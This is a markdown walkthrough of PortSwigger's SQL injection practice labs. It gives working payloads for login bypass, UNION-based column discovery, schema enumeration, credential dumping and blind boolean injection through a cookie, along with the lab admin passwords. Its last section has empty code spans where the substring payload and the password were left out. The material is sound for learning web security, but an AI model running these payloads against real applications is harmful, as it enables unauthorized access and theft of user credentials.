# SQL injection

[Cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## Error-based SQL injection labs

### [Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

Vulnerable URL: https://domain/filter?category=category

Test payload: `category'--`
- This payload shows more products (a condition in the SQL clause was ignored)

To show all products: `category' OR 1=1--`
- `1=1` is an always true statement, meaning the query will return all the results

### [Lab: SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

Vulnerable URL: https://domain/login

To log in as administrator: type `administrator'--` in the username and anything in the password
- This payload ignores the verification of the password and logs in only if the user exists

### [Lab: SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

Vulnerable URL: https://domain/filter?category=category

To check the number of columns returned by the query: `category' UNION SELECT NULL,NULL,NULL--`
- If 4 NULLs are provided, the server will return an error (so the query returns 3 columns)

### [Lab: SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

Vulnerable URL: https://domain/filter?category=category

To check the number of columns returned by the query: `category' UNION SELECT NULL,NULL,NULL--`

To check the column with the string payload: `category' UNION SELECT NULL,'a',NULL--`
- The second column returns a string payload that can be used to get info from the database
- To solve the lab: `category' UNION SELECT NULL,'kyFUj0',NULL--`

### [Lab: SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

Vulnerable URL: https://domain/filter?category=category

To check the number of columns returned by the query: `category' UNION SELECT NULL,NULL--`

To check the column with the string payload: `category' UNION SELECT 'a','a'--`

To retrieve the data: `category' UNION SELECT username,password FROM users--`
- To solve the lab, just log in as `administrator:1tmn9btoqihk657tsaxd`

### [Lab: SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)

Vulnerable URL: https://domain/filter?category=category

To check the number of columns returned by the query: `category' UNION SELECT NULL,NULL--`

To check the column with the string payload: `category' UNION SELECT NULL,'a'--`

To retrieve the data: `category' UNION SELECT NULL,username || ':' || password FROM users--`
- Only one column returns a string, so we have to concatenate the content in one column using `||`
- To solve the lab, we just log in as `administrator:93tj2cw6fpat84p6tmna`

### [Lab: SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

Vulnerable URL: https://domain/filter?category=category

To check the number of columns returned by the query: `category' UNION SELECT NULL,NULL FROM dual--`
- On Oracle databases, we have to specify the table when using the `UNION` statement. The `dual` table can be used for that purpose

To check the column with the string payload: `category' UNION SELECT 'a','a' FROM dual--`

To retrieve the data: `category' UNION SELECT BANNER,NULL FROM v$version--`
- The table `v$version` contains information on the database. This table has a column `BANNER` with the database version

### [Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

Vulnerable URL: https://domain/filter?category=category

Test payload: `category'#`
- If `'--` is used, the server will return an error. For that reason, the comment key on this database is a `#`

To check the number of columns returned by the query: `category' UNION SELECT NULL,NULL#`

To check the column with the string payload: `category' UNION SELECT 'a','a'#`

To retrieve the data: `category' UNION SELECT @@version,NULL#`
- On SQL Server and MySQL databases, information on the version can be found with `SELECT @@version`

### [Lab: SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

Vulnerable URL: https://domain/filter?category=category

To check the number of columns returned by the query: `category' UNION SELECT NULL,NULL--`

To check the column with the string payload: `category' UNION SELECT 'a','a'--`

To get all the tables (and columns on each table) in the database: `category' UNION SELECT table_name,STRING_AGG(column_name, ',') FROM information_schema.columns GROUP BY table_name--`
- This query returns all database tables and their columns. It works on PostgreSQL databases. To use it in MySQL, change `STRING_AGG(column, sep)` to `GROUP_CONCAT(column)`. For other databases, check the documentation for equivalent functions
- The `information_schema.columns` is a table on databases (except Oracle) that has information on all columns from all tables in the database
- Searching through the tables, we can find a `users_xdykim` table with the columns `username_ygnyzx` and `password_wkknxs`

To retrieve all the users: `category' UNION SELECT username_ygnyzx,password_wkknxs FROM users_xdykim--`
- To solve the lab, log in as `administrator:9cwgy2lthvk0ta1ctjos`

### [Lab: SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

Vulnerable URL: https://domain/filter?category=category

To check the number of columns returned by the query: `category' UNION SELECT NULL,NULL FROM dual--`

To check the column with the string payload: `category' UNION SELECT 'a','a' FROM dual--`

To get all the tables (and columns on each table) in the database: `category' UNION SELECT table_name,LISTAGG(column_name, ',') WITHIN GROUP(ORDER BY column_name) column_list FROM user_tab_cols GROUP BY table_name--`
- This query returns all database tables and their columns. It works on Oracle databases. The function `LISTAGG(column, sep)` aggregates a column on a row with a separator and requires `WITHIN GROUP(ORDER BY column) group_name` to work
- The `all_tab_columns` is a table on Oracle databases that has information on all columns from all tables in the database
- Searching through the tables, we can find a `USERS_WBZCLJ` table with the columns `USERNAME_WQDOCJ` and `PASSWORD_NLFHLD`

To retrieve all the users: `category' UNION SELECT USERNAME_WQDOCJ,PASSWORD_NLFHLD FROM USERS_WBZCLJ--`
- To solve the lab, log in as `administrator:v4v788550kfkkew3h2oi`


## Blind SQL injection labs

### [Lab: Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

Vulnerable URL: https://domain/filter?category=category
- This URL uses a TrackingId cookie to show a `Welcome back!` message. This cookie is vulnerable to SQL injection

Test payload: `cookie' AND 1=1--` and `cookie' AND 1=2--`
- When `AND 1=1--` is injected the welcome back message shows, but when `AND 1=2--` is injected, the message disappears. The message can be controlled by the injected payload, so the site is vulnerable

To log in as administrator, we need to enumerate the password. To do this, first we discover the length of the password: `cookie' AND (SELECT username FROM users WHERE username = 'administrator' AND LENGTH(password) > [size]) = 'administrator'--`
- We need to try this payload increasing the value of `[size]` until the welcome back message disappears from the screen, when that happens the query will be false and we will have the length of the password
- The password is 20 characters long

To enumerate the password, we need to check each character from it. ``
- This function gets the character in the `[position]`th position of the string and compares with `[character]`. If the comparison is true, the welcome back message will appear in the screen. We need to compare each character from the password (changing the `[position]` value from `1` to `[size]`), with 
a charater (brute force the character `[a-z||0-9]`)
- The password is ``


## References
- https://portswigger.net/web-security/sql-injection
- https://portswigger.net/web-security/sql-injection/union-attacks
- https://portswigger.net/web-security/sql-injection/examining-the-database
